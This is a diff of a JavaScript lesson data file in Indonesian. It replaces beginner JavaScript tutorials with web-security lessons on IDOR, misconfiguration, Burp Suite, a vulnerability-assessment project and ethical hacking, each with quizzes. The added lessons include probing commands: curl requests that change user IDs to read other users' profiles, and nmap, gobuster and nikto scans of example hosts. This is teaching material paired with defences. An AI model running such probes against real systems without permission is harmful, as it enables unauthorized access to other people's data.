-let buah = ["apel", "mangga", "jeruk"];
-console.log(buah[0]);      // "apel" (index mulai dari 0)
-console.log(buah.length);  // 3
+User A login dan mengakses profilnya:
 
-buah[3] = "anggur";        // tambah elemen
+\`\`\`text
+GET /api/users/1001/profile  →  data user A
 \`\`\`
 
-## Method Dasar
+Penyerang mencoba mengubah ID:
 
-\`\`\`javascript
-let arr = [1, 2, 3];
-
-arr.push(4);        // [1,2,3,4] - tambah di akhir
-arr.pop();          // [1,2,3] - hapus dari akhir
-arr.unshift(0);     // [0,1,2,3] - tambah di awal
-arr.shift();        // [1,2,3] - hapus dari awal
-arr.indexOf(2);     // 1 - cari index
-arr.includes(2);    // true - cek keberadaan
+\`\`\`bash
+# Mengakses profil user lain tanpa otorisasi
+curl -H "Cookie: session=userA" https://target.example.com/api/users/1002/profile
+curl https://target.example.com/api/users/1003/invoices/4567.pdf
 \`\`\`
 
-## Method Fungsional (Higher-Order)
+## Pencegahan
 
-Method ini sangat powerful untuk transformasi data:
+\`\`\`python
+# BURUK: langsung pakai ID dari URL
+@app.route("/api/users/<int:uid>/profile")
+def profile(uid):
+    return User.query.get(uid)  # IDOR!
 
-\`\`\`javascript
-const angka = [1, 2, 3, 4, 5];
-
-// map - ubah setiap elemen
-const kali2 = angka.map(n => n * 2); // [2,4,6,8,10]
-
-// filter - saring berdasarkan kondisi
-const genap = angka.filter(n => n % 2 === 0); // [2,4]
-
-// reduce - gabungkan jadi satu nilai
-const total = angka.reduce((acc, n) => acc + n, 0); // 15
-
-// forEach - iterasi tanpa return
-angka.forEach(n => console.log(n));
-
-// find - cari elemen pertama yang cocok
-const pertama = angka.find(n => n > 3); // 4
+# BAIK: validasi ownership
+@app.route("/api/users/<int:uid>/profile")
+@auth_required
+def profile(uid):
+    if uid != current_user.id and not current_user.is_admin:
+        abort(403)
+    return User.query.get(uid)
 \`\`\`
 
-## Destructuring dan Spread
-
-\`\`\`javascript
-const [a, b, c] = [1, 2, 3]; // a=1, b=2, c=3
-const [first, ...rest] = [1, 2, 3, 4]; // first=1, rest=[2,3,4]
-const gabung = [...arr1, ...arr2]; // gabungkan array
+\`\`\`text
+- Gunakan UUID/guid alih-alih ID integer berurutan
+- Implementasi authorization check di setiap endpoint
+- Pakai indirect reference map per session
+- Audit semua endpoint yang menerima ID resource
+- Logging akses untuk deteksi anomali
 \`\`\`
 
-> **Best Practice:** Gunakan \`map\`, \`filter\`, \`reduce\` untuk manipulasi data—lebih deklaratif dan mudah dibaca dibanding loop tradisional.`,
+> IDOR adalah salah satu bentuk Broken Access Control yang paling umum dan berada di peringkat #1 OWASP Top 10 2021.`,
     quiz: [
       {
-        question: "Method manakah yang menambah elemen di akhir array?",
-        options: ["push", "pop", "shift", "unshift"],
+        question: "Apa itu IDOR?",
+        options: ["Akses resource tanpa otorisasi via referensi objek", "Backup ID", "Enkripsi ID", "Menghapus ID"],
         answer: 0,
-        explanation: "push menambah elemen di akhir array. pop menghapus dari akhir, unshift menambah di awal, shift menghapus dari awal."
+        explanation: "IDOR terjadi ketika user mengakses objek (ID/filename) tanpa validasi otorisasi."
       },
       {
-        question: "Apa hasil dari [1,2,3].map(n => n * 2)?",
-        options: ["[1,2,3]", "[2,4,6]", "6", "[1,1,1]"],
+        question: "Cara paling efektif mencegah IDOR?",
+        options: ["Pakai ID integer berurutan", "Authorization check di setiap endpoint", "Bagikan semua ID", "Cache ID"],
         answer: 1,
-        explanation: "map mengubah setiap elemen dengan function yang diberikan. 1*2=2, 2*2=4, 3*2=6, jadi hasilnya [2,4,6]."
+        explanation: "Validasi otorisasi di setiap akses resource memastikan user hanya bisa mengakses data miliknya."
       },
       {
-        question: "Apa fungsi method reduce?",
-        options: [
-          "Menyaring elemen array",
-          "Menggabungkan elemen array menjadi satu nilai",
-          "Mengurutkan array",
-          "Menghapus elemen"
-        ],
+        question: "Mengapa UUID membantu mitigasi IDOR?",
+        options: ["Mempercepat query", "Sulit ditebak & tidak berurutan", "Menghemat storage", "Mengompres data"],
         answer: 1,
-        explanation: "reduce menggabungkan semua elemen array menjadi satu nilai tunggal (seperti total penjumlahan, produk, dll)."
+        explanation: "UUID tidak berurutan dan sulit ditebak, sehingga penyerang tidak dapat menebak ID resource lain."
       }
     ]
   },
   {
     level: 4,
     order: 8,
-    title: "Object",
-    slug: "js-object",
-    description: "Memahami object: property, method, this, destructuring, dan spread operator.",
-    icon: "🎁",
+    title: "Security Misconfiguration",
+    slug: "security-misconfiguration",
+    description: "Kesalahan konfigurasi yang membuka celah keamanan.",
+    icon: "⚙️",
     isProject: false,
-    content: `# Object dalam JavaScript
+    content: `# Security Misconfiguration
 
-**Object** adalah struktur data yang menyimpan pasangan **key-value**. Object sangat penting untuk merepresentasikan entitas dunia nyata dalam kode.
+**Security Misconfiguration** terjadi ketika sistem, aplikasi, atau server dikonfigurasi dengan pengaturan tidak aman — baik default, terlalu permisif, atau terbuka untuk umum. Ini termasuk dalam OWASP Top 10 dan sering menjadi pintu masuk utama penyerang.
 
-## Membuat dan Mengakses Object
+## Contoh Umum
 
-\`\`\`javascript
-let mhs = {
-  nama: "Budi Santoso",
-  umur: 20,
-  aktif: true,
-  hobi: ["coding", "gaming"]
-};
+- Default credentials tidak diubah (\`admin/admin\`).
+- Directory listing aktif.
+- Stack trace error ditampilkan ke user.
+- Service tidak perlu terbuka ke publik (SSH, DB, Redis).
+- Sertifikat TLS expired atau self-signed tanpa validasi.
+- Header keamanan (HSTS, CSP, X-Frame-Options) tidak diatur.
 
-// Akses property (2 cara)
-console.log(mhs.nama);      // dot notation
-console.log(mhs["umur"]);   // bracket notation
+## Identifikasi
+
+\`\`\`bash
+# Cek header & versi server
+curl -I https://target.example.com
+nmap -sV -p 80,443,22,3306,6379 target.example.com
+
+# Cek directory listing
+curl https://target.example.com/.git/
+curl https://target.example.com/backup/
 \`\`\`
 
-## Method dalam Object
+## Mitigasi
 
-\`\`\`javascript
-let kalkulator = {
-  hasil: 0,
-  tambah(a, b) {
-    return a + b;
-  },
-  kali(a, b) {
-    return a * b;
-  }
-};
-
-console.log(kalkulator.tambah(2, 3)); // 5
+\`\`\`nginx
+# Nginx hardening
+server_tokens off;
+add_header X-Frame-Options "SAMEORIGIN";
+add_header X-Content-Type-Options "nosniff";
+add_header Strict-Transport-Security "max-age=31536000" always;
+add_header Content-Security-Policy "default-src 'self'";
 \`\`\`
 
-## Keyword \`this\`
-
-\`this\` merujuk ke object tempat method dipanggil:
-
-\`\`\`javascript
-let user = {
-  nama: "Andi",
-  sapa() {
-    return "Halo, saya " + this.nama;
-  }
-};
-console.log(user.sapa()); // "Halo, saya Andi"
+\`\`\`text
+- Hardening sesuai CIS Benchmark
+- Disable default accounts & ubah default password
+- Tutup port yang tidak perlu (firewall)
+- Matikan debug mode di production
+- Hapus file backup/.git dari webroot
+- Patch & update rutin
 \`\`\`
 
-## Destructuring dan Spread
-
-\`\`\`javascript
-// Destructuring
-const { nama, umur } = mhs;
-console.log(nama); // "Budi Santoso"
-
-// Rename saat destructuring
-const { nama: namaLengkap } = mhs;
-
-// Spread (copy object)
-const mhsBaru = { ...mhs, jurusan: "TI" };
-\`\`\`
-
-## Optional Chaining
-
-\`\`\`javascript
-let data = { user: { nama: "Budi" } };
-console.log(data?.user?.nama);    // "Budi"
-console.log(data?.profile?.nama); // undefined (tidak error)
-\`\`\`
-
-> **Best Practice:** Gunakan object untuk mengelompokkan data terkait. Manfaatkan destructuring dan optional chaining untuk kode yang lebih bersih.`,
+> Konfigurasi aman bukan tugas sekali jalan. Lakukan audit berkala dan otomatisasi hardening dengan tools seperti Ansible atau Terraform.`,
     quiz: [
       {
-        question: "Bagaimana cara mengakses property object menggunakan bracket notation?",
-        options: [
-          "object.property",
-          "object[property]",
-          "object->property",
-          "object::property"
-        ],
+        question: "Contoh security misconfiguration?",
+        options: ["Enkripsi AES-256", "Default credentials tidak diubah", "HTTPS aktif", "Rate limiting"],
         answer: 1,
-        explanation: "Bracket notation menggunakan object['property']. Berguna saat key dinamis atau mengandung karakter khusus."
+        explanation: "Default credentials yang tidak diubah adalah contoh klasik security misconfiguration."
       },
       {
-        question: "Apa yang dirujuk oleh keyword this dalam method object?",
-        options: [
-          "Window global",
-          "Object tempat method dipanggil",
-          "Function itu sendiri",
-          "undefined"
-        ],
-        answer: 1,
-        explanation: "Dalam regular function/method, this merujuk ke object tempat method tersebut dipanggil."
+        question: "Header yang mencegah clickjacking?",
+        options: ["X-Frame-Options", "Content-Type", "Host", "Accept"],
+        answer: 0,
+        explanation: "X-Frame-Options mencegah halaman di-iframe oleh situs lain, memitigasi clickjacking."
       },
       {
-        question: "Apa fungsi optional chaining (?.)?",
-        options: [
-          "Memaksa property ada",
-          "Mengakses property aman tanpa error jika undefined/null",
-          "Membuat property optional",
-          "Menghapus property"
-        ],
-        answer: 1,
-        explanation: "Optional chaining (?.) mengakses property dengan aman—mengembalikan undefined jika ada yang null/undefined, tanpa error."
+        question: "Standar konfigurasi aman yang populer?",
+        options: ["CIS Benchmark", "OWASP CSRFGuard", "RFC 1918", "ISO 8601"],
+        answer: 0,
+        explanation: "CIS Benchmark adalah panduan hardening konfigurasi sistem yang banyak diadopsi industri."
       }
     ]
   },
   {
     level: 4,
     order: 9,
-    title: "DOM",
-    slug: "js-dom",
-    description: "Mengenal Document Object Model: cara memanipulasi elemen HTML dengan JavaScript.",
-    icon: "🌳",
+    title: "Burp Suite Basics",
+    slug: "burp-suite-basics",
+    description: "Tool proxy intercept untuk pengujian keamanan web.",
+    icon: "🔧",
     isProject: false,
-    content: `# DOM (Document Object Model)
+    content: `# Burp Suite Basics
 
-**DOM** adalah representasi struktur halaman web sebagai object yang bisa dimanipulasi dengan JavaScript. Dengan DOM, kamu bisa mengubah konten, style, dan struktur HTML secara dinamis.
+**Burp Suite** oleh PortSwigger adalah tool proxy intercept paling populer untuk pengujian keamanan aplikasi web. Burp berada di antara browser dan server, memungkinkan kita melihat, memodifikasi, dan mengulang request HTTP.
 
-## Mengakses Elemen
+## Komponen Utama
 
-\`\`\`javascript
-// Berdasarkan ID (kembalikan 1 elemen)
-const judul = document.getElementById("judul");
+1. **Proxy** — intercept & edit request/response secara real-time.
+2. **Repeater** — kirim ulang request dengan modifikasi manual.
+3. **Intruder** — fuzzing otomatis (sniper, battering ram, pitchfork).
+4. **Scanner** (Pro) — automated vulnerability scanner.
+5. **Decoder/Comparer** — encode/decode dan bandingkan response.
 
-// Berdasarkan selector CSS
-const tombol = document.querySelector(".tombol");
-const item = document.querySelectorAll("li"); // NodeList
+## Setup Proxy
+
+\`\`\`bash
+# Burp default listener
+127.0.0.1:8080
+
+# Konfigurasi Firefox ke proxy Burp
+# Settings > Network Settings > Manual Proxy: 127.0.0.1:8080
+
+# Install certificate CA Burp agar HTTPS bisa diintercept
+# http://burp/cert  →  import ke Firefox Authorities
 \`\`\`
 
-## Mengubah Konten dan Style
+## Workflow Dasar
 
-\`\`\`javascript
-const el = document.getElementById("pesan");
-
-// Ubah teks
-el.textContent = "Halo Dunia!";
-
-// Ubah HTML
-el.innerHTML = "<strong>Tebal</strong>";
-
-// Ubah style
-el.style.color = "blue";
-el.style.fontSize = "20px";
-
-// Tambah/hapus class
-el.classList.add("aktif");
-el.classList.remove("aktif");
-el.classList.toggle("aktif");
+\`\`\`text
+1. Konfigurasi browser → proxy ke Burp
+2. Browse target → Burp capture semua request di HTTP History
+3. Kirim request ke Repeater (Ctrl+R) untuk modifikasi manual
+4. Tes payload SQLi/XSS di parameter
+5. Kirim ke Intruder untuk fuzzing otomatis
+6. Analisis response untuk konfirmasi kerentanan
 \`\`\`
 
-## Membuat dan Menambah Elemen
-
-\`\`\`javascript
-// Buat elemen baru
-const paragraf = document.createElement("p");
-paragraf.textContent = "Paragraf baru";
-paragraf.classList.add("intro");
-
-// Tambahkan ke DOM
-document.body.appendChild(paragraf);
-
-// Sisipkan sebelum elemen lain
-const container = document.getElementById("container");
-container.insertBefore(paragraf, container.firstChild);
+\`\`\`bash
+# Burp Community CLI (alternatif: mitmproxy)
+mitmproxy --mode regular -p 8080
 \`\`\`
 
-## Menghapus Elemen
-
-\`\`\`javascript
-const el = document.getElementById("lama");
-el.remove(); // hapus elemen
-\`\`\`
-
-## Mengubah Atribut
-
-\`\`\`javascript
-const link = document.querySelector("a");
-link.setAttribute("href", "https://google.com");
-link.getAttribute("href");
-link.removeAttribute("target");
-\`\`\`
-
-> **Tips:** Gunakan \`querySelector\` dan \`querySelectorAll\` karena lebih fleksibel—bisa pakai selector CSS apa pun.`,
+> Burp Suite Community Edition sudah cukup untuk belajar web pentesting. Versi Pro menambahkan automated scanner dan ekstensi tambahan.`,
     quiz: [
       {
-        question: "Method manakah yang mengembalikan elemen pertama yang cocok dengan selector CSS?",
-        options: ["getElementById", "querySelector", "getElementsByClassName", "querySelectorAll"],
+        question: "Apa fungsi Burp Suite?",
+        options: ["Backup database", "Proxy intercept untuk uji keamanan web", "Antivirus", "Web server"],
         answer: 1,
-        explanation: "querySelector mengembalikan elemen pertama yang cocok dengan selector CSS. querySelectorAll mengembalikan semua elemen yang cocok."
+        explanation: "Burp Suite adalah proxy yang intercept dan memodifikasi request HTTP untuk pengujian keamanan web."
       },
       {
-        question: "Apa perbedaan textContent dan innerHTML?",
-        options: [
-          "Tidak ada perbedaan",
-          "textContent hanya teks, innerHTML bisa HTML tag",
-          "innerHTML lebih cepat",
-          "textContent untuk input"
-        ],
+        question: "Komponen Burp untuk mengulang request manual?",
+        options: ["Intruder", "Repeater", "Decoder", "Scanner"],
         answer: 1,
-        explanation: "textContent hanya mengatur teks biasa (HTML tag akan ditampilkan sebagai teks). innerHTML memparse HTML, jadi tag akan dirender."
+        explanation: "Repeater digunakan untuk mengirim ulang request dengan modifikasi manual dan menganalisis response."
       },
       {
-        question: "Method apa untuk menambah elemen sebagai child terakhir?",
-        options: ["appendBefore", "appendChild", "addChild", "insertLast"],
-        answer: 1,
-        explanation: "appendChild menambahkan elemen sebagai child terakhir dari parent. insertBefore untuk menyisipkan di posisi tertentu."
+        question: "Port default listener Burp Suite?",
+        options: ["80", "443", "8080", "3306"],
+        answer: 2,
+        explanation: "Burp Suite secara default mendengarkan proxy di 127.0.0.1:8080."
       }
     ]
   },
   {
     level: 4,
     order: 10,
-    title: "Event",
-    slug: "js-event",
-    description: "Belajar menangani event: click, submit, input, dan event object dengan addEventListener.",
-    icon: "⚡",
-    isProject: false,
-    content: `# Event dalam JavaScript
-
-**Event** adalah kejadian yang terjadi di halaman web—klik tombol, ketik keyboard, submit form, dll. JavaScript bisa merespons event dengan \`addEventListener\`.
-
-## addEventListener
-
-\`\`\`javascript
-const tombol = document.getElementById("tombol");
-
-tombol.addEventListener("click", function() {
-  alert("Tombol diklik!");
-});
-
-// Arrow function juga bisa
-tombol.addEventListener("click", () => console.log("Klik!"));
-\`\`\`
-
-## Jenis Event Umum
-
-\`\`\`javascript
-// Mouse events
-element.addEventListener("click", handler);
-element.addEventListener("dblclick", handler);
-element.addEventListener("mouseenter", handler);
-element.addEventListener("mouseleave", handler);
-
-// Keyboard events
-document.addEventListener("keydown", (e) => {
-  console.log("Key ditekan: " + e.key);
-});
-
-// Form events
-form.addEventListener("submit", (e) => {
-  e.preventDefault(); // cegah reload
-  console.log("Form disubmit");
-});
-
-input.addEventListener("input", (e) => {
-  console.log(e.target.value);
-});
-\`\`\`
-
-## Event Object
-
-Handler menerima **event object** dengan info kejadian:
-
-\`\`\`javascript
-tombol.addEventListener("click", (event) => {
-  console.log(event.type);      // "click"
-  console.log(event.target);    // elemen yang diklik
-  console.log(event.clientX);   // koordinat X mouse
-  event.preventDefault();       // cegah aksi default
-  event.stopPropagation();      // cegah event bubbling
-});
-\`\`\`
-
-## Event Delegation
-
-Manfaatkan **event bubbling** untuk handle banyak elemen dengan satu listener:
-
-\`\`\`javascript
-const list = document.getElementById("list");
-
-list.addEventListener("click", (e) => {
-  if (e.target.tagName === "LI") {
-    console.log("Klik item: " + e.target.textContent);
-  }
-});
-\`\`\`
-
-## Menghapus Event Listener
-
-\`\`\`javascript
-function handler() { console.log("halo"); }
-tombol.addEventListener("click", handler);
-tombol.removeEventListener("click", handler); // harus function yang sama
-\`\`\`
-
-> **Best Practice:** Gunakan event delegation untuk list dinamis—lebih efisien daripada pasang listener di setiap item.`,
-    quiz: [
-      {
-        question: "Apa fungsi event.preventDefault()?",
-        options: [
-          "Menghentikan event",
-          "Mencegah aksi default elemen (seperti reload form)",
-          "Menghapus elemen",
-          "Mempercepat event"
-        ],
-        answer: 1,
-        explanation: "preventDefault mencegah aksi default browser, misalnya mencegah form submit yang biasanya me-reload halaman."
-      },
-      {
-        question: "Apa itu event delegation?",
-        options: [
-          "Menyerahkan event ke server",
-          "Pasang satu listener di parent untuk handle child",
-          "Menghapus semua event",
-          "Event yang hanya untuk admin"
-        ],
-        answer: 1,
-        explanation: "Event delegation memanfaatkan event bubbling—pasang satu listener di parent untuk menangani event dari child elements."
-      },
-      {
-        question: "Property apa untuk mendapatkan nilai input saat event input?",
-        options: ["event.value", "event.target.value", "event.input", "event.data"],
-        answer: 1,
-        explanation: "event.target merujuk ke elemen yang memicu event, dan .value berisi nilai input saat ini."
-      }
-    ]
-  },
-  {
-    level: 4,
-    order: 11,
-    title: "Fetch API",
-    slug: "js-fetch-api",
-    description: "Mengambil data dari server dengan Fetch API menggunakan then-catch dan async-await.",
-    icon: "📡",
-    isProject: false,
-    content: `# Fetch API
-
-**Fetch API** adalah interface modern JavaScript untuk melakukan HTTP request ke server. Fetch mengembalikan **Promise**, sehingga mendukung \`then/catch\` dan \`async/await\`.
-
-## Fetch Dasar (then-catch)
-
-\`\`\`javascript
-fetch("https://api.example.com/users")
-  .then(response => {
-    if (!response.ok) {
-      throw new Error("HTTP error: " + response.status);
-    }
-    return response.json(); // parse JSON
-  })
-  .then(data => {
-    console.log(data);
-  })
-  .catch(error => {
-    console.error("Error:", error);
-  });
-\`\`\`
-
-## Async/Await (lebih bersih)
-
-\`\`\`javascript
-async function ambilUser() {
-  try {
-    const response = await fetch("https://api.example.com/users");
-    if (!response.ok) throw new Error("Gagal: " + response.status);
-    const data = await response.json();
-    console.log(data);
-  } catch (error) {
-    console.error("Error:", error);
-  }
-}
-ambilUser();
-\`\`\`
-
-## POST Request (Kirim Data)
-
-\`\`\`javascript
-async function tambahUser() {
-  const response = await fetch("https://api.example.com/users", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      nama: "Budi",
-      email: "budi@mail.com"
-    })
-  });
-  const data = await response.json();
-  console.log(data);
-}
-\`\`\`
-
-## Konfigurasi Fetch
-
-\`\`\`javascript
-fetch(url, {
-  method: "POST",            // GET, POST, PUT, DELETE
-  headers: { ... },          // header HTTP
-  body: JSON.stringify(data),// data untuk POST/PUT
-  mode: "cors",              // mode request
-  credentials: "include"     // kirim cookie
-});
-\`\`\`
-
-## Response Methods
-
-\`\`\`javascript
-response.json();   // parse sebagai JSON
-response.text();   // ambil sebagai teks
-response.blob();   // untuk file/binary
-response.status;   // kode HTTP (200, 404, dll)
-response.ok;       // true jika status 200-299
-\`\`\`
-
-> **Best Practice:** Selalu cek \`response.ok\` sebelum parsing, dan gunakan \`try/catch\` dengan async/await untuk error handling yang bersih.`,
-    quiz: [
-      {
-        question: "Apa yang dikembalikan oleh fetch()?",
-        options: ["Object data", "Promise", "JSON", "String"],
-        answer: 1,
-        explanation: "fetch() mengembalikan Promise yang resolve ke Response object. Untuk mendapatkan data, perlu .json() atau .text()."
-      },
-      {
-        question: "Method apa untuk mengirim data dengan POST request?",
-        options: ["method: 'GET'", "method: 'POST' dengan body", "type: 'POST'", "send: 'data'"],
-        answer: 1,
-        explanation: "Untuk POST, set method: 'POST' dan sertakan body berisi data (biasanya JSON.stringify)."
-      },
-      {
-        question: "Property apa untuk mengecek apakah request berhasil (status 200-299)?",
-        options: ["response.success", "response.ok", "response.done", "response.status === true"],
-        answer: 1,
-        explanation: "response.ok bernilai true jika status HTTP antara 200-299 (sukses). Cek ini sebelum parsing data."
-      }
-    ]
-  },
-  {
-    level: 4,
-    order: 12,
-    title: "Project: To-Do List",
-    slug: "project-todo-list",
-    description: "Bangun aplikasi To-Do List interaktif dengan JavaScript yang menyimpan data ke localStorage.",
-    icon: "✅",
+    title: "Project: Web Vuln Assessment",
+    slug: "project-web-vuln-assessment",
+    description: "Proyek melakukan asesmen kerentanan web aplikasi lengkap.",
+    icon: "🎯",
     isProject: true,
-    content: `# Project: To-Do List
+    content: `# Project: Web Vuln Assessment
 
-Pada project ini, kamu akan membangun **aplikasi To-Do List** lengkap menggunakan HTML, CSS, dan JavaScript. Aplikasi ini menggabungkan semua konsep yang telah dipelajari di Level 4.
+Pada proyek akhir Level 4, Anda akan melakukan **asesmen kerentanan aplikasi web secara end-to-end** menggunakan metodologi OWASP dan tools profesional. Targetnya adalah aplikasi lab yang sengaja dibuat rentan (mis. DVWA, OWASP Juice Shop).
 
-## Fitur yang Dibangun
+## Tahapan Proyek
 
-- **Tambah tugas** baru melalui input form
-- **Tandai selesai** dengan checkbox (strikethrough)
-- **Hapus tugas** dengan tombol
-- **Filter** tugas: semua / aktif / selesai
-- **Edit tugas** secara inline
-- **Simpan ke localStorage** agar data tetap ada setelah refresh
-- **Hitung jumlah tugas** aktif
+### 1. Reconnaissance
 
-## Struktur HTML
+\`\`\`bash
+# Identifikasi teknologi
+whatweb https://juice-shop.example.com
+wappalyzer-cli https://juice-shop.example.com
 
-\`\`\`html
-<div id="app">
-  <h1>To-Do List</h1>
-  <form id="form-tugas">
-    <input type="text" id="input-tugas" placeholder="Tambah tugas..." required>
-    <button type="submit">Tambah</button>
-  </form>
-  <div id="filter">
-    <button data-filter="all">Semua</button>
-    <button data-filter="active">Aktif</button>
-    <button data-filter="done">Selesai</button>
-  </div>
-  <ul id="list-tugas"></ul>
-  <p id="jumlah-tugas"></p>
-</div>
+# Subdomain & endpoint
+gobuster dir -u https://juice-shop.example.com -w /usr/share/wordlists/dirb/common.txt
 \`\`\`
 
-## Logika JavaScript Utama
+### 2. Vulnerability Scanning
 
-\`\`\`javascript
-let tugas = JSON.parse(localStorage.getItem("tugas")) || [];
+\`\`\`bash
+# Automated scan
+zap-cli quick-scan https://juice-shop.example.com
+nikto -h https://juice-shop.example.com
 
-function simpan() {
-  localStorage.setItem("tugas", JSON.stringify(tugas));
-}
-
-function render(filter = "all") {
-  const list = document.getElementById("list-tugas");
-  list.innerHTML = "";
-  const filtered = tugas.filter(t => {
-    if (filter === "active") return !t.selesai;
-    if (filter === "done") return t.selesai;
-    return true;
-  });
-  filtered.forEach((t, i) => {
-    const li = document.createElement("li");
-    li.innerHTML = \`
-      <input type="checkbox" \${t.selesai ? "checked" : ""}>
-      <span>\${t.teks}</span>
-      <button class="hapus">Hapus</button>
-    \`;
-    li.querySelector("input").addEventListener("change", () => {
-      t.selesai = !t.selesai;
-      simpan(); render(filter);
-    });
-    li.querySelector(".hapus").addEventListener("click", () => {
-      tugas.splice(tugas.indexOf(t), 1);
-      simpan(); render(filter);
-    });
-    list.appendChild(li);
-  });
-}
-
-document.getElementById("form-tugas").addEventListener("submit", (e) => {
-  e.preventDefault();
-  const input = document.getElementById("input-tugas");
-  tugas.push({ teks: input.value, selesai: false });
-  input.value = "";
-  simpan(); render();
-});
-render();
+# Manual testing dengan Burp Suite
+# - Intercept semua form
+# - Tes parameter untuk SQLi/XSS/IDOR
 \`\`\`
 
-## Langkah Implementasi
+### 3. Eksploitasi & Verifikasi
 
-1. **Buat struktur HTML** dengan form input, filter buttons, dan list kosong
-2. **Styling CSS** agar tampil menarik (gunakan flexbox)
-3. **Inisialisasi data** dari localStorage
-4. **Buat function render()** untuk menampilkan list tugas
-5. **Tambah event listener** untuk submit form (tambah tugas)
-6. **Implementasi checkbox** untuk toggle selesai
-7. **Implementasi tombol hapus** untuk menghapus tugas
-8. **Implementasi filter** dengan event delegation
-9. **Simpan ke localStorage** setiap perubahan
-10. **Tambah edit inline** (bonus)
+\`\`\`text
+- Konfirmasi setiap finding secara manual
+- Dokumentasikan PoC (screenshot, request, response)
+- Klasifikasikan severity (Critical/High/Medium/Low) berdasar CVSS
+- Jangan eksploitasi lebih dari yang diperlukan untuk PoC
+\`\`\`
 
-## Tantangan Tambahan
+## Deliverables
 
-- Tambah **due date** untuk setiap tugas
-- Tambah **prioritas** (tinggi/sedang/rendah)
-- **Drag and drop** untuk reorder
-- **Export/import** tugas sebagai JSON
-- **Dark mode** toggle`,
+\`\`\`text
+1. Laporan PDF dengan struktur:
+   - Executive Summary
+   - Methodology
+   - Findings (dengan PoC & remediation)
+   - Risk Rating Matrix
+2. File Burp Project (.burp) dengan semua request
+3. Video demo eksploitasi tiap kerentanan
+4. Checklist OWASP Top 10 yang tercakup
+\`\`\`
+
+> Proyek ini mensimulasikan engagement pentest nyata. Dokumentasi yang baik sama pentingnya dengan temuan teknis — klien membaca laporan, bukan terminal Anda.`,
     quiz: [
       {
-        question: "API apa yang digunakan untuk menyimpan data permanen di browser?",
-        options: ["sessionStorage", "localStorage", "cookies", "cache"],
-        answer: 1,
-        explanation: "localStorage menyimpan data permanen di browser tanpa expiry. Data tetap ada walau browser ditutup."
+        question: "Aplikasi lab yang sengaja dibuat rentan untuk belajar?",
+        options: ["OWASP Juice Shop", "Gmail", "GitHub", "Netflix"],
+        answer: 0,
+        explanation: "OWASP Juice Shop adalah aplikasi modern yang sengaja dibuat rentan untuk latihan keamanan web."
       },
       {
-        question: "Mengapa kita perlu JSON.stringify dan JSON.parse saat menyimpan object ke localStorage?",
-        options: [
-          "localStorage butuh JSON",
-          "localStorage hanya bisa menyimpan string",
-          "Agar lebih cepat",
-          "Tidak perlu, bisa langsung simpan object"
-        ],
-        answer: 1,
-        explanation: "localStorage hanya bisa menyimpan string. JSON.stringify mengubah object jadi string, JSON.parse mengubah kembali jadi object."
+        question: "Tool untuk brute-force directory web?",
+        options: ["Gobuster", "Wireshark", "Nmap -sV", "tcpdump"],
+        answer: 0,
+        explanation: "Gobuster adalah tool populer untuk menemukan direktori dan file tersembunyi via brute-force wordlist."
       },
       {
-        question: "Pada project To-Do List, kapan function simpan() dipanggil?",
-        options: [
-          "Hanya saat tambah tugas",
-          "Setiap kali data tugas berubah",
-          "Saat halaman dimuat",
-          "Tidak perlu dipanggil"
-        ],
+        question: "Apa yang harus ada di laporan pentest?",
+        options: ["Hanya temuan", "Methodology, Findings, PoC, Remediation", "Foto penyerang", "Kode sumber aplikasi"],
         answer: 1,
-        explanation: "simpan() harus dipanggil setiap kali data tugas berubah (tambah, hapus, toggle selesai) agar localStorage selalu sinkron."
+        explanation: "Laporan pentest profesional mencakup metodologi, temuan dengan PoC, severity, dan rekomendasi remediasi."
       }
     ]
   },
 
-  // ==================== LEVEL 5 - BACKEND (NODE.JS) ====================
+  // ==================== LEVEL 5 - ETHICAL HACKING (8) ====================
   {
     level: 5,
     order: 1,
-    title: "Pengenalan Node.js",
-    slug: "pengenalan-nodejs",
-    description: "Mengenal Node.js: runtime JavaScript di luar browser, event loop, dan cara kerjanya.",
-    icon: "🟢",
+    title: "Pengenalan Ethical Hacking",
+    slug: "pengenalan-ethical-hacking",
+    description: "Memahami peran ethical hacker dan metodologi pentest.",
+    icon: "⚔️",
     isProject: false,
-    content: `# Pengenalan Node.js
+    content: `# Pengenalan Ethical Hacking
 
-**Node.js** adalah runtime JavaScript yang memungkinkan kita menjalankan JavaScript di server (di luar browser). Node.js dibangun di atas **V8 engine** (engine Chrome) dan menggunakan **event-driven, non-blocking I/O**.
+**Ethical Hacking** adalah praktik menyerang sistem secara legal dan terstruktur untuk menemukan kerentanan sebelum penyerang sungguhan melakukannya. Pelakunya disebut **ethical hacker** atau **penetration tester**, bekerja dengan izin tertulis dari pemilik sistem.
 
-## Mengapa Node.js?
+## Jenis Hacker
 
-- **Single language**: gunakan JavaScript untuk frontend dan backend
-- **Cepat**: berkat V8 engine dan non-blocking I/O
-- **NPM**: ekosistem package terbesar
-- **Real-time**: cocok untuk aplikasi chat, game, streaming
+- **White Hat** — hacker etis, bekerja dengan izin untuk meningkatkan keamanan.
+- **Black Hat** — penyerang jahat, ilegal, motivasi keuntungan pribadi.
+- **Gray Hat** — menembus sistem tanpa izin, tapi tidak untuk kejahatan.
 
-## Instalasi dan Cek Versi
+## Jenis Penetration Test
+
+1. **Black Box** — tester tidak tahu apa-apa tentang target.
+2. **White Box** — tester diberi akses penuh (source code, arsitektur).
+3. **Gray Box** — kombinasi, sebagian info diberikan.
+
+## Metodologi PTES
+
+\`\`\`text
+1. Pre-engagement Interactions   (kontrak, scope, RoE)
+2. Intelligence Gathering        (reconnaissance)
+3. Threat Modeling               (analisis aset & ancaman)
+4. Vulnerability Analysis        (scan & identifikasi)
+5. Exploitation                  (memanfaatkan kerentanan)
+6. Post-Exploitation             (privilege escalation, persistensi)
+7. Reporting                     (dokumentasi & remediasi)
+\`\`\`
+
+## Kode Etik
 
 \`\`\`bash
-# Cek versi Node.js
-node --version
-# v20.x.x
-
-# Cek versi NPM
-npm --version
-# 10.x.x
+# Aturan emas ethical hacker:
+# 1. Dapatkan izin tertulis SEBELUM testing
+# 2. Hormati privacy & jangan akses data pribadi
+# 3. Jangan menyebabkan downtime
+# 4. Laporkan semua temuan ke klien
+# 5. Jaga kerahasiaan data yang ditemukan
 \`\`\`
 
-## Hello World di Node.js
-
-Buat file \`app.js\`:
-
-\`\`\`javascript
-console.log("Halo dari Node.js!");
-
-// Server sederhana
-const http = require("http");
-const server = http.createServer((req, res) => {
-  res.writeHead(200, { "Content-Type": "text/plain" });
-  res.end("Halo Dunia!");
-});
-server.listen(3000, () => {
